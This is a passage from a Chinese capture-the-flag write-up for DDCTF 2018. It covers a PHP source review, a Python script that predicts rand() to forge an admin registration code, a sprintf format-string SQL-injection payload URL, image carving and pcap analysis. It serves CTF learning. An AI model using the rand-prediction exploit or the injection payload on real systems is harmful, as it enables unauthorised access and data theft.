class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'id'</span>]))&#123;</span><br><span class=\"line\">    $id = addslashes($_GET[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'title'</span>]))&#123;</span><br><span class=\"line\">        $title = addslashes($_GET[<span class=\"string\">'title'</span>]);</span><br><span class=\"line\">        $title = sprintf(<span class=\"string\">\"AND title='%s'\"</span>, $title);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $title = <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $sql = sprintf(<span class=\"string\">\"SELECT * FROM article WHERE id='%s' $title\"</span>, $id);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($pdo-&gt;query($sql) <span class=\"keyword\">as</span> $row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h1&gt;\"</span>.$row[<span class=\"string\">'title'</span>].<span class=\"string\">\"&lt;/h1&gt;&lt;br&gt;\"</span>.$row[<span class=\"string\">'content'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">die</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到该地方使用了两次sprintf，可以立马想到<a href=\"https://paper.seebug.org/386/\" target=\"_blank\" rel=\"noopener\">从WordPress SQLi谈PHP格式化字符串问题</a>,问题就是，需要以admin的身份登录。</p>\n<h3 id=\"login-php\"><a href=\"#login-php\" class=\"headerlink\" title=\"login.php\"></a>login.php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($_SERVER[&apos;REQUEST_METHOD&apos;] === &quot;POST&quot;) &#123;</span><br><span class=\"line\">    if(!(isset($_POST[&apos;csrf&apos;]) and (string)$_POST[&apos;csrf&apos;] === $_SESSION[&apos;csrf&apos;])) &#123;</span><br><span class=\"line\">        die(&quot;CSRF token error!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);</span><br><span class=\"line\">    $password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) &#123;</span><br><span class=\"line\">        die(&apos;Invalid input&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT password FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch()[0] !== $password) &#123;</span><br><span class=\"line\">        die(&apos;wrong password&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT `identity` FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch()[0] === &quot;admin&quot;) &#123;</span><br><span class=\"line\">        $_SESSION[&apos;is_admin&apos;] = true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $_SESSION[&apos;is_admin&apos;] = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    #echo $username;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>login部分使用pdo进行查询，并且字符串之间的比较也是”===”，不可能存在任何漏洞。</p>\n<h3 id=\"register-php\"><a href=\"#register-php\" class=\"headerlink\" title=\"register.php\"></a>register.php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!(isset($_POST[&apos;csrf&apos;]) and (string)$_POST[&apos;csrf&apos;] === $_SESSION[&apos;csrf&apos;])) &#123;</span><br><span class=\"line\">        die(&quot;CSRF token error!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $admin = &quot;admin###&quot; . substr(str_shuffle(&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;), 0, 32);</span><br><span class=\"line\">    $username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);</span><br><span class=\"line\">    $password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);</span><br><span class=\"line\">    $code = (isset($_POST[&apos;code&apos;]) === true) ? (string)$_POST[&apos;code&apos;] : &apos;&apos;;</span><br><span class=\"line\">    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) &#123;</span><br><span class=\"line\">        die(&apos;Invalid input&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT username FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch() !== false) &#123;</span><br><span class=\"line\">        die(&apos;username has been registered&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === $admin) &#123;</span><br><span class=\"line\">        $identity = &quot;admin&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $identity = &quot;guest&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:password&apos; =&gt; $password, &apos;:identity&apos; =&gt; $identity]);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &apos;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;./login.php&quot;&lt;/script&gt;&apos;;</span><br><span class=\"line\">&#125; else &#123;</span><br></pre></td></tr></table></figure>\n<p>register部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; id=&quot;csrf&quot; value=&quot;&lt;?php $_SESSION[&apos;csrf&apos;] = (string)rand();echo $_SESSION[&apos;csrf&apos;]; ?&gt;&quot; required&gt;</span><br><span class=\"line\">&lt;label for=&quot;inputUsername&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt;</span><br></pre></td></tr></table></figure>\n<p>可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找<a href=\"https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html\" target=\"_blank\" rel=\"noopener\">Web应用隐形后门的设计与实现</a>。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。</p>\n<h2 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，<a href=\"http://www.vuln.cn/6004\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6004</a>,文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!php</span><br><span class=\"line\">state[i] = state[i-3] + state[i-31]</span><br><span class=\"line\">return state[i] % 2147483648</span><br></pre></td></tr></table></figure>\n<p>同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。</p>\n<p>此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void php_string_shuffle(char *str, long len TSRMLS_DC) /* &#123;&#123;&#123; */</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong n_elems, rnd_idx, n_left;</span><br><span class=\"line\">\tchar temp;</span><br><span class=\"line\">\t/* The implementation is stolen from array_data_shuffle       */</span><br><span class=\"line\">\t/* Thus the characteristics of the randomization are the same */</span><br><span class=\"line\">\tn_elems = len;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (n_elems &lt;= 1) &#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tn_left = n_elems;</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile (--n_left) &#123;</span><br><span class=\"line\">\t\trnd_idx = php_rand(TSRMLS_C);</span><br><span class=\"line\">\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);</span><br><span class=\"line\">\t\tif (rnd_idx != n_left) &#123;</span><br><span class=\"line\">\t\t\ttemp = str[n_left];</span><br><span class=\"line\">\t\t\tstr[n_left] = str[rnd_idx];</span><br><span class=\"line\">\t\t\tstr[rnd_idx] = temp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中RAND_RANGE函数的实现如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define RAND_RANGE(__n, __min, __max, __tmax) \\</span><br><span class=\"line\">(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span><br></pre></td></tr></table></figure>\n<p>准备工作就绪，就可以编写代码了。<br>代码如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from lxml import etree</span><br><span class=\"line\"></span><br><span class=\"line\">url = &quot;http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    &apos;username&apos;: &apos;dida&apos;,</span><br><span class=\"line\">    &apos;password&apos;: &apos;dida&apos;,</span><br><span class=\"line\">    &apos;csrf&apos;: &apos;2086003527&apos;,</span><br><span class=\"line\">    &apos;code&apos;: &apos;&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def get_csrf(html):</span><br><span class=\"line\">    html = etree.HTML(html)</span><br><span class=\"line\">    token = html.xpath(&apos;//*[@id=&quot;csrf&quot;]&apos;)[0].get(&apos;value&apos;)</span><br><span class=\"line\">    return token</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def rand_range(rand, n_left):</span><br><span class=\"line\">     return int((n_left + 1.0) * (rand / (2147483648.0)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def shuffle(calc_rand):</span><br><span class=\"line\">    str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">    str_temp = list(str)</span><br><span class=\"line\">    str_len = len(str_temp)</span><br><span class=\"line\">    n_left = str_len - 1</span><br><span class=\"line\">    temp = &quot;&quot;</span><br><span class=\"line\">    while n_left:</span><br><span class=\"line\">        randdata = calc_rand[61 - n_left]</span><br><span class=\"line\">        index = rand_range(randdata, n_left)</span><br><span class=\"line\">        if index != n_left:</span><br><span class=\"line\">            temp = str_temp[n_left]</span><br><span class=\"line\">            str_temp[n_left] = str_temp[index]</span><br><span class=\"line\">            str_temp[index] = temp</span><br><span class=\"line\">        n_left = n_left - 1</span><br><span class=\"line\"></span><br><span class=\"line\">    return &quot;&quot;.join(str_temp)</span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    s = requests.session()</span><br><span class=\"line\">    l = []</span><br><span class=\"line\">    for i in range(33):</span><br><span class=\"line\">        res = s.get(url)</span><br><span class=\"line\">        token = get_csrf(res.content)</span><br><span class=\"line\">        l.append(token)</span><br><span class=\"line\"></span><br><span class=\"line\">    calc_rand = []</span><br><span class=\"line\">    temp_calc_rand = []</span><br><span class=\"line\">    for i in range(33, 95):</span><br><span class=\"line\">        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648</span><br><span class=\"line\">        l.append(value)</span><br><span class=\"line\">        temp_calc_rand.append(value)</span><br><span class=\"line\"></span><br><span class=\"line\">    str = &quot;admin###&quot; + shuffle(temp_calc_rand)[0:32]</span><br><span class=\"line\">    data[&apos;code&apos;] = str</span><br><span class=\"line\">    data[&apos;csrf&apos;] = l[32]</span><br><span class=\"line\"></span><br><span class=\"line\">    res = s.post(url = url, data = data)</span><br><span class=\"line\">    print(res.content)</span><br><span class=\"line\">    break</span><br></pre></td></tr></table></figure>\n<p>运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。</p>\n<p>登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。<br>基本的payload如下:</p>\n<blockquote>\n<p><a href=\"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$&#39;\" target=\"_blank\" rel=\"noopener\">http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$&#39;</a> or 2=1 union select 1,2,3%23</p>\n</blockquote>\n<p>最后得到flag: <code>DDCTF{9b7ccc1e96387b5ce079adab2fb08022}</code></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"签到题目\"><a href=\"#签到题目\" class=\"headerlink\" title=\"签到题目:\"></a>签到题目:</h1><p>复制，粘贴</p>\n<h1 id=\"╯°□°）╯︵-┻━┻\"><a href=\"#╯°□°）╯︵-┻━┻\" class=\"headerlink\" title=\"(╯°□°）╯︵ ┻━┻\"></a>(╯°□°）╯︵ ┻━┻</h1><p>题目给了一个字符串<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</span><br></pre></td></tr></table></figure></p>\n<p>首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：</p>\n<p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</p>\n<p>进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示”DD”, 然后以此类推：</p>\n<p><img src=\"/assets/ddctf/20180420150038.png\" alt=\"avatar\"></p>\n<h1 id=\"第四扩展FS\"><a href=\"#第四扩展FS\" class=\"headerlink\" title=\"第四扩展FS\"></a>第四扩展FS</h1><ol>\n<li>下载下来是一张图片</li>\n</ol>\n<p>首先: <code>binwalk windows.jpg</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL         HEX             DESCRIPTION</span><br><span class=\"line\">-------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">30              0x1E            TIFF image data, big-endian</span><br><span class=\"line\">2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes</span><br><span class=\"line\">7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: &quot;file.txt&quot;</span><br><span class=\"line\">7257054         0x6EBBDE        End of Zip archive</span><br><span class=\"line\"></span><br><span class=\"line\">Progress: 81.81% (10890274 / 13310878)</span><br></pre></td></tr></table></figure>\n<p>可以看到图片里边有个压缩包。<br>这时候，可以使用<code>dd</code>或者<code>foremost</code>命令，来分离压缩包。</p>\n<blockquote>\n<p>dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1<br>foremost windows.jpg</p>\n</blockquote>\n<p>得到一个压缩包，然后，查看图片属性，会在详细信息-&gt;备注里看到一个字符串”Pactera”，估计就是密码。</p>\n<ol start=\"2\">\n<li>然后打开file.txt</li>\n</ol>\n<p><img src=\"/assets/ddctf/20180420151247.png\" alt=\"avatar\"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -o . file.txt | sort |uniq -c | sort -rn</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ddctf/20180420151941.png\" alt=\"avatar\"></p>\n<p>然后从新组合一下，就得到flag了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DDCTF&#123;ZuozHengqU3dEshi&#125;</span><br></pre></td></tr></table></figure>","more":"<h1 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h1><p>这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。<br>过程如下:<br>首先大体上浏览整个数据包，会发现，大体上就是3个部分:  </p>\n<ul>\n<li>ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  </li>\n<li>邮件相关的数据包</li>\n<li>https相关的包，由于只有几个，竟然被我选择性忽略了。</li>\n</ul>\n<h2 id=\"ftp之Fl-g-zxip\"><a href=\"#ftp之Fl-g-zxip\" class=\"headerlink\" title=\"ftp之Fl-g.zxip\"></a>ftp之Fl-g.zxip</h2><blockquote>\n<p>tcp.stream eq 2004   </p>\n</blockquote>\n<p>右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。</p>\n<p>然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import * </span><br><span class=\"line\">pcaps = rdpcap(&quot;flag.pcap&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;flag.zip&quot;, &quot;wb&quot;)</span><br><span class=\"line\">length = 0</span><br><span class=\"line\">for pcap in pcaps:</span><br><span class=\"line\">    value = pcap[&apos;Raw&apos;].original</span><br><span class=\"line\">    length += len(value)</span><br><span class=\"line\">    fp.write(value)</span><br><span class=\"line\">print(length)</span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n<p>得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。</p>\n<h2 id=\"ftp之sqlmap-zip\"><a href=\"#ftp之sqlmap-zip\" class=\"headerlink\" title=\"ftp之sqlmap.zip\"></a>ftp之sqlmap.zip</h2><blockquote>\n<p>tcp.stream eq 2005</p>\n</blockquote>\n<p>既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import * </span><br><span class=\"line\">pcaps = rdpcap(&quot;sqlmap.pcap&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;sqlmap.zip&quot;, &quot;wb&quot;)</span><br><span class=\"line\">length = 0</span><br><span class=\"line\">for pcap in pcaps:</span><br><span class=\"line\">    value = pcap[&apos;Raw&apos;].original</span><br><span class=\"line\">    length += len(value)</span><br><span class=\"line\">    fp.write(value)</span><br><span class=\"line\">print(length)</span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n<p>得到了一个sqlmap.zip，第一次打开，用winrar，点击工具-&gt;修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。</p>\n<p>已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。</p>\n<p>然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。</p>\n<h2 id=\"邮件部分\"><a href=\"#邮件部分\" class=\"headerlink\" title=\"邮件部分\"></a>邮件部分</h2><p>通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-type: image/png; name=&quot;image001.png&quot;;</span><br><span class=\"line\"> x-mac-creator=&quot;4F50494D&quot;;</span><br><span class=\"line\"> x-mac-type=&quot;504E4766&quot;</span><br><span class=\"line\">Content-ID: &lt;image001.png@01D38B05.8079CE40&gt;</span><br><span class=\"line\">Content-disposition: inline;</span><br><span class=\"line\">\tfilename=&quot;image001.png&quot;</span><br><span class=\"line\">Content-transfer-encoding: base64</span><br></pre></td></tr></table></figure>\n<p>下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span 